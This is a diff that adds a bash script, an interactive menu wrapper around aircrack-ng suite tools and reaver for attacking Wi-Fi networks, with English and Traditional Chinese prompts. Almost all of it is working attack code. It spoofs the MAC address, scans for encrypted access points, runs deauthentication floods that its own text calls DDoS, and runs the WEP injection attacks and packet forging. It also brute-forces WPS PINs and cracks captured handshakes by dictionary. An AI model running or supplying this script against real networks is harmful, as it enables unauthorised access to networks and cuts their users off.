@@ -1,0 +1,608 @@
+#!/bin/bash
+
+
+
+### Translations ########################
+TEXT01="WLAN Interface Not found"
+TEXT02="Press Any key to exit"
+TEXT03="Choose WLAN Interface"
+TEXT04="EXIT"
+TEXT05="Choose the target AP"
+TEXT06="Press 0 to exit"
+TEXT07="Use Dictionary Attack"
+TEXT08="Options"
+TEXT09="Choose the dictionary file"
+TEXT10="Choose Attack Target Client"
+TEXT11="Select the number of deauths to send"
+TEXT12="0 means send them continuously"
+TEXT13="Choose .xor file"
+TEXT14="Scanning AP"
+TEXT15="Return"
+TEXT16="reassociation timing in seconds"
+TEXT17="To Distribution System"
+
+set_lang_fun(){
+case $LANG in
+    zh_*)
+    ### Select Language
+    clear
+    echo -e ""
+    echo -e "    Select Language"
+    echo -e ""
+    echo -e "    1) English"
+    echo -e ""
+    echo -e "    2) Traditional Chinese"
+    echo -e ""
+    read SET_LANG
+    [[ "$SET_LANG" ]]
+
+    if [ "$SET_LANG" == "2" ]; then
+        TEXT01="沒有找到無線網卡介面"
+        TEXT02="按任意鍵退出"
+        TEXT03="選擇無線網卡介面"
+        TEXT04="退出"
+        TEXT05="選擇目標AP"
+        TEXT06="按0退出"
+        TEXT07="使用字典檔"
+        TEXT08="選項"
+        TEXT09="選擇字典檔"
+        TEXT10="選擇要攻擊的客戶端"
+        TEXT11="選擇阻斷次數"
+        TEXT12="阻斷次數0為循環攻擊(DDOS攻擊), Client 將無法上網."
+        TEXT13="選擇.xor檔案"
+        TEXT14="掃描AP"
+        TEXT15="返回"
+        TEXT16="設定重新連線驗證延遲 (秒)"
+        TEXT17="目的地為分散式系統"
+    fi
+
+esac
+}
+
+##############################################
+
+##############################################
+NONE_WLAN=0
+
+if [ -d "/sys/class/ieee80211" ]; then
+    WLAN_DETECT=$(ls /sys/class/ieee80211/)
+    if [ "$WLAN_DETECT" == "" ]; then
+        NONE_WLAN=1
+    fi
+else
+    NONE_WLAN=1
+fi
+
+if [ "$NONE_WLAN" == "0" ]; then
+    PHY0=$(ls /sys/class/ieee80211/ | grep phy0)
+    PHYX=$(ls /sys/class/ieee80211/ | sed '/phy0/d')
+
+    ### WIFI Interface
+    mkdir -p /tmp/aircrack-ng
+    iw dev | sed -e 's/^[ \t]*//g' | sed 's/phy#/phy/g' | sed ':label;N;s/\n//;b label' | sed 's/phy0/\nphy0/' | sed 's/ifindex.*//g' | sed 's/Interface /=/g' > /tmp/aircrack-ng/iw-dev-info
+
+    WLAN0=$(cat /tmp/aircrack-ng/iw-dev-info | grep $PHY0 | sed 's/.*=//')
+    WLANX=$(cat /tmp/aircrack-ng/iw-dev-info | grep $PHYX | sed 's/.*=//')
+
+fi
+
+#################### 停用監聽
+stop_mon_fun(){
+### restore
+MON=$(cat /tmp/aircrack-ng/mon)
+WLAN=$(cat /tmp/aircrack-ng/wlan)
+
+airmon-ng stop $MON
+ifconfig $WLAN down
+macchanger -p $WLAN
+ifconfig $WLAN up
+service networking start
+service network-manager start
+rm -rf /tmp/aircrack-ng
+}
+
+#################### 啟動監聽
+start_mon_fun(){
+
+### Changing MAC
+ifconfig $WLAN down
+macchanger --mac 00:11:22:33:44:55 $WLAN
+
+### monitor mode
+airmon-ng check kill
+airmon-ng start $WLAN
+ifconfig $MON up
+
+MON=$(iwconfig 2>&1 | grep mon | awk '{print $1}')
+echo $MON > /tmp/aircrack-ng/mon
+
+}
+
+#################### 選擇介面卡
+choose_interface_fun(){
+
+if [ "$NONE_WLAN" == "1" ]; then
+    clear
+    ### choose wlan interface
+    echo -e ""
+    echo -e "    Aircrack-ng CLI"
+    echo -e ""
+    echo -e "    $TEXT01"
+    echo -e ""
+    echo -e "    $TEXT02"
+    read choose
+    [[ "$choose" ]]
+
+    exit
+
+elif [ "$NONE_WLAN" == "0" ]; then
+    if [ "$PHYX" == "" ]; then
+        clear
+        ### choose wlan interface
+        echo -e ""
+        echo -e "    Aircrack-ng CLI"
+        echo -e ""
+        echo -e "    $TEXT03"
+        echo -e "    1) $PHY0 $WLAN0"
+        echo -e "    0) $TEXT04"
+        read choose
+        [[ "$choose" ]]
+
+        if [ "$choose" == "1" ]; then
+            WLAN="$WLAN0"
+        elif [ "$choose" == "0" ]; then
+            exit
+        else
+            WLAN="$WLAN0"
+        fi
+    elif [ "$PHY0" == "" ]; then
+        clear
+        ### choose wlan interface
+        echo -e ""
+        echo -e "    Aircrack-ng CLI"
+        echo -e ""
+        echo -e "    $TEXT03"
+        echo -e "    1) $PHYX $WLANX"
+        echo -e "    0) $TEXT04"
+        read choose
+        [[ "$choose" ]]
+
+        if [ "$choose" == "1" ]; then
+            WLAN="$WLANX"
+        elif [ "$choose" == "0" ]; then
+            exit
+        else
+            WLAN="$WLANX"
+        fi
+
+    else
+        clear
+        ### choose wlan interface
+        echo -e ""
+        echo -e "    Aircrack-ng CLI"
+        echo -e ""
+        echo -e "    $TEXT03"
+        echo -e "    1) $PHY0 $WLAN0"
+        echo -e "    2) $PHYX $WLANX"
+        echo -e "    0) $TEXT04"
+        read choose
+        [[ "$choose" ]]
+
+        if [ "$choose" == "1" ]; then
+            WLAN="$WLAN0"
+        elif [ "$choose" == "2" ]; then
+            WLAN="$WLANX"
+        elif [ "$choose" == "0" ]; then
+            exit
+        else
+            WLAN="$WLAN0"
+        fi
+    fi
+fi
+
+echo $WLAN > /tmp/aircrack-ng/wlan
+start_mon_fun
+menu_fun
+
+}
+
+#################### 掃描 AP
+scan_ap_fun(){
+rm -rf /tmp/aircrack-ng/scan-*
+rm -rf /tmp/aircrack-ng/taraps-*
+airodump-ng --wps -w /tmp/aircrack-ng/scan $MON
+clear
+sed '1d' /tmp/aircrack-ng/scan-01.kismet.csv | awk -F'[;\t]' '{print $1, $3, $4, $6, $10, $22, $8}' | sed -e 's/,.*//g' > /tmp/aircrack-ng/tmp
+cat /tmp/aircrack-ng/tmp | awk '{if($7!="OPN")print}' | awk -F'[ \t]' '{print "   ", $1" -", $3, $4, $5, $6, $7, $2}' > /tmp/aircrack-ng/aps
+
+echo -e ""
+echo -e "    $TEXT05"
+echo -e ""
+echo -e "    Num BSSID            CH SPD  POW ENC  ESSID"
+cat /tmp/aircrack-ng/aps
+echo -e ""
+echo -e "    x) $TEXT15"
+echo -e "    0) $TEXT04"
+read TARGET
+[[ "$TARGET" ]]
+if [ "$TARGET" == "x" ]; then
+    menu_fun
+elif [ "$TARGET" == "0" ]; then
+    stop_mon_fun
+    exit
+fi
+
+cat /tmp/aircrack-ng/aps | grep "    $TARGET -" | sed -e 's/.*- //g' > /tmp/aircrack-ng/target
+
+BSSID=$(cat /tmp/aircrack-ng/target | awk '{print $1}')
+CH=$(cat /tmp/aircrack-ng/target | awk '{print $2}')
+
+
+ENC=$(cat /tmp/aircrack-ng/target | awk '{print $5}')
+ESSID=$(cat /tmp/aircrack-ng/target | awk '{print $6}')
+
+### ESSID
+if [ "$ESSID" == "" ]; then
+    NULL_ESSID=1
+else
+    NULL_ESSID=0
+fi
+
+xterm -title "airodump-ng - $ESSID" -e "airodump-ng -c $CH --wps -w /tmp/aircrack-ng/taraps --bssid $BSSID $MON" &
+
+attack_main_fun
+
+}
+
+#################### 使用字典
+use_dict_fun(){
+clear
+echo -e ""
+echo -e "     $TEXT07"
+echo -e ""
+echo -e "     $TEXT08[y/n]"
+read DICTIONARY
+[[ "$DICTIONARY" ]]
+
+if [ "$DICTIONARY" == "y" ]; then
+    zenity --file-selection --title="$TEXT09" --filename=$HOME/ > /tmp/aircrack-ng/dict-path
+    DICT=$(cat /tmp/aircrack-ng/dict-path)
+    USE_DICT=1
+else
+    USE_DICT=0
+fi
+
+}
+
+#################### Aircrack crack
+aircrack_fun(){
+### aircrack-ng
+if [ "$USE_DICT" == "1" ]; then
+    aircrack-ng -w $DICT /tmp/aircrack-ng/taraps-01.cap
+    read
+else
+    aircrack-ng /tmp/aircrack-ng/taraps-01.cap
+    read
+fi
+
+attack_main_fun
+}
+
+#################### 取得客戶端MAC (STATION)
+get_client_fun(){
+cutline=$(cat /tmp/aircrack-ng/taraps-01.csv | grep -a -n Station |awk -F : '{print $1}')
+sed 1,"$cutline"d /tmp/aircrack-ng/taraps-01.csv > /tmp/aircrack-ng/tmp
+cat /tmp/aircrack-ng/tmp -n | sed '$d'| awk -F'[,\t]' '{print $1, $2}' > /tmp/aircrack-ng/client
+clear
+echo -e ""
+echo -e "     $TEXT10"
+echo -e ""
+cat /tmp/aircrack-ng/client
+echo -e ""
+echo -e "     0) $TEXT15"
+
+read CLIENT
+[[ "$CLIENT" ]]
+
+if [ "$CLIENT" == "0" ]; then
+    attack_main_fun
+fi
+
+cat /tmp/aircrack-ng/client | grep "$CLIENT " > /tmp/aircrack-ng/client_mac
+STATION=$(cat /tmp/aircrack-ng/client_mac |awk '{print $2}')
+
+}
+
+#################### deauth (aireplay-ng 0)
+aireplay_0_fun(){
+get_client_fun
+echo -e ""
+echo -e "    Deauthentication"
+echo -e ""
+echo -e "    $TEXT11"
+echo -e "    $TEXT12"
+echo -e ""
+read COUNT
+[[ "$COUNT" ]]
+
+xterm -title "Deauth - $ESSID" -e "aireplay-ng -0 $COUNT -a $BSSID -c $STATION $MON" &
+
+attack_main_fun
+
+}
+
+#################### fakeauth (aireplay-ng 1)
+aireplay_1_fun(){
+clear
+echo -e ""
+echo -e "    Fake authentication"
+echo -e ""
+echo -e "    $TEXT16"
+echo -e ""
+read DELAY
+[[ "$DELAY" ]]
+
+if [ "$DELAY" == "" ]; then
+    if [ "$NULL_ESSID" == "1" ]; then
+        xterm -title "Fake Auth - $ESSID" -e "aireplay-ng -1 6000 -o 1 -q 10 -a $BSSID $MON" &
+    else
+        xterm -title "Fake Auth - $ESSID" -e "aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID $MON" &
+    fi
+else
+    if [ "$NULL_ESSID" == "1" ]; then
+        xterm -title "Fake Auth - $ESSID" -e "aireplay-ng -1 $DELAY -a $BSSID $MON" &
+    else
+        xterm -title "Fake Auth - $ESSID" -e "aireplay-ng -1 $DELAY -e $ESSID $MON" &
+    fi
+fi
+
+attack_main_fun
+}
+
+#################### Interactive 0841 (aireplay-ng 2)
+aireplay_2_fun(){
+clear
+echo -e ""
+echo -e "    Interactive packet replay"
+echo -e ""
+echo -e "    1) Modified Packet Replay (0841)"
+echo -e ""
+echo -e "    2) Natural Packet Replay"
+echo -e ""
+read IPR
+[[ "$IPR" ]]
+
+echo -e "    $TEXT17 (To DS)"
+echo -e ""
+echo -e "    $TEXT08 [y/n]"
+read DS
+[[ "$DS" ]]
+
+if [ "$IPR" == "y" ]; then
+    if [ "$DS" == "y" ]; then
+        if [ "$NULL_ESSID" == "1" ]; then
+            xterm -title "Interactive 0841 ToDS - $ESSID" -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -t 1 $MON" &
+        else
+            xterm -title "Interactive 0841 ToDS - $ESSID" -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -e $ESSID -t 1 $MON" &
+        fi
+    else
+        if [ "$NULL_ESSID" == "1" ]; then
+            xterm -title "Interactive 0841 - $ESSID" -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID $MON" &
+        else
+            xterm -title "Interactive 0841 - $ESSID" -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -e $ESSID $MON" &
+        fi
+    fi
+else
+    if [ "$DS" == "y" ]; then
+        if [ "$NULL_ESSID" == "1" ]; then
+            xterm -title "Interactive ToDS - $ESSID" -e "aireplay-ng -2 -c FF:FF:FF:FF:FF:FF -b $BSSID -t 1 $MON" &
+        else
+            xterm -title "Interactive ToDS - $ESSID" -e "aireplay-ng -2 -c FF:FF:FF:FF:FF:FF -e $ESSID -t 1 $MON" &
+        fi
+    else
+        if [ "$NULL_ESSID" == "1" ]; then
+            xterm -title "Interactive - $ESSID" -e "aireplay-ng -2 -c FF:FF:FF:FF:FF:FF -b $BSSID $MON" &
+        else
+            xterm -title "Interactive - $ESSID" -e "aireplay-ng -2 -c FF:FF:FF:FF:FF:FF -e $ESSID $MON" &
+        fi
+    fi
+fi
+
+attack_main_fun
+}
+
+#################### ARP Replay (aireplay-ng 3)
+aireplay_3_fun(){
+if [ "$NULL_ESSID" == "1" ]; then
+    xterm -title "ARP Replay - $ESSID" -e "aireplay-ng -3 -b $BSSID $MON" &
+else
+    xterm -title "ARP Replay - $ESSID" -e "aireplay-ng -3 -e $ESSID $MON" &
+fi
+
+attack_main_fun
+}
+
+#################### KoreK Chop Chop (aireplay-ng 4)
+aireplay_4_fun(){
+rm -rf *.xor
+
+if [ "$NULL_ESSID" == "1" ]; then
+    xterm -title "KoreK Chop Chop - $ESSID" -e "aireplay-ng -4 -b $BSSID $MON" &
+else
+    xterm -title "KoreK Chop Chop - $ESSID" -e "aireplay-ng -4 -e $ESSID $MON" &
+fi
+
+attack_main_fun
+}
+
+#################### Fragmentation (aireplay-ng 5)
+aireplay_5_fun(){
+rm -rf *.xor
+
+if [ "$NULL_ESSID" == "1" ]; then
+    xterm -title "Fragmentation - $ESSID" -e "aireplay-ng -5 -b $BSSID $MON" &
+else
+    xterm -title "Fragmentation - $ESSID" -e "aireplay-ng -5 -e $ESSID $MON" &
+fi
+attack_main_fun
+}
+
+#################### Cafe Latte (aireplay-ng 6)
+aireplay_6_fun(){
+
+if [ "$NULL_ESSID" == "1" ]; then
+    xterm -title "Cafe Latte - $ESSID" -e "aireplay-ng -6 -b $BSSID -D $MON" &
+else
+    xterm -title "Cafe Latte - $ESSID" -e "aireplay-ng -6 -e $ESSID -D $MON" &
+fi
+attack_main_fun
+}
+
+#################### Hirte Attack (aireplay-ng 7)
+aireplay_7_fun(){
+
+xterm -title "Hirte Attack" -e "aireplay-ng -7 -D $MON" &
+
+attack_main_fun
+}
+
+#################### Injection TEST (aireplay-ng 9)
+aireplay_9_fun(){
+
+if [ "$NULL_ESSID" == "1" ]; then
+    aireplay-ng -9 $MON
+    read
+else
+    aireplay-ng -9 -e $ESSID $MON
+    read
+fi
+
+attack_main_fun
+}
+
+#################### Packet Forge
+packetforge_fun(){
+zenity --file-selection --title="$TEXT13" --file-filter=*.xor --filename=$HOME/ > /tmp/aircrack-ng/xor-path
+XOR=$(cat /tmp/aircrack-ng/xor-path)
+
+if [ "$NULL_ESSID" == "1" ]; then
+    xterm -title "Forge New Packet" -e "packetforge-ng -0 -a $BSSID -k 255.255.255.255 -l 255.255.255.255 -y $XOR -w /tmp/aircrack-ng/forge-packet" &
+else
+    xterm -title "Forge New Packet" -e "packetforge-ng -0 -e $ESSID -k 255.255.255.255 -l 255.255.255.255 -y $XOR -w /tmp/aircrack-ng/forge-packet" &
+fi
+
+sleep 10
+
+xterm -title "Inject the Forge Packet - $ESSID" -e "aireplay-ng -2 -r /tmp/aircrack-ng/forge-packet $MON" &
+
+attack_main_fun
+}
+
+#################### WPS Svan
+wps_scan_fun(){
+
+xterm -title "WPS INFO" -e "wash -i $MON" &
+
+attack_main_fun
+}
+
+#################### Reaver
+reaver_crack_fun(){
+## reaver -i $MON -b $BSSID -vv
+reaver -i $MON -b $BSSID -c $CH -a -N -vv
+read
+attack_main_fun
+}
+
+#################### Aircrack Attack MENU
+attack_main_fun(){
+clear
+echo -e ""
+echo -e "    Attack MENU"
+echo -e ""
+echo -e "    WPA Attack Mode:"
+echo -e "    0) Deauth"
+echo -e ""
+echo -e "    WEP Attack Mode:"
+echo -e "    1) Fake Auth         2) Interactive 0841    3) ARP Replay"
+echo -e "    4) KoreK Chop Chop   5) Fragmentation       6) Cafe Latte"
+echo -e "    7) Hirte Attack      8) Packet Forge        9) Injection TEST"
+echo -e ""
+echo -e "    WPS Attack Mode:"
+echo -e "    10) WPS Scan"
+echo -e "    11) Reaver"
+echo -e ""
+echo -e "    Packet Crack:"
+echo -e "    12) Aircrack-ng"
+echo -e ""
+echo -e "    x) $TEXT15"
+
+read ATTACK
+[[ "$ATTACK" ]]
+
+if [ "$ATTACK" == "0" ]; then
+    aireplay_0_fun
+elif [ "$ATTACK" == "1" ]; then
+    aireplay_1_fun
+elif [ "$ATTACK" == "2" ]; then
+    aireplay_2_fun
+elif [ "$ATTACK" == "3" ]; then
+    aireplay_3_fun
+elif [ "$ATTACK" == "4" ]; then
+    aireplay_4_fun
+elif [ "$ATTACK" == "5" ]; then
+    aireplay_5_fun
+elif [ "$ATTACK" == "6" ]; then
+    aireplay_6_fun
+elif [ "$ATTACK" == "7" ]; then
+    aireplay_7_fun
+elif [ "$ATTACK" == "8" ]; then
+    packetforge_fun
+elif [ "$ATTACK" == "9" ]; then
+    aireplay_9_fun
+elif [ "$ATTACK" == "10" ]; then
+    wps_scan_fun
+elif [ "$ATTACK" == "11" ]; then
+    reaver_crack_fun
+elif [ "$ATTACK" == "12" ]; then
+    use_dict_fun
+    aircrack_fun
+elif [ "$ATTACK" == "x" ]; then
+    menu_fun
+else
+    attack_main_fun
+fi
+
+}
+
+####################################################################
+
+
+#################### 選單
+menu_fun(){
+clear
+echo -e ""
+echo -e "    Aircrack-ng CLI"
+echo -e ""
+echo -e "    1) $TEXT14"
+echo -e "    0) $TEXT04"
+read MENU
+[[ "$MENU" ]]
+
+if [ "$MENU" == "1" ]; then
+    scan_ap_fun
+else
+    stop_mon_fun
+    exit
+fi
+}
+
+#################### START
+if [ ! -f "/tmp/aircrack-ng/mon" ]; then
+    set_lang_fun
+    choose_interface_fun
+else
+    set_lang_fun
+    menu_fun
+fi
+
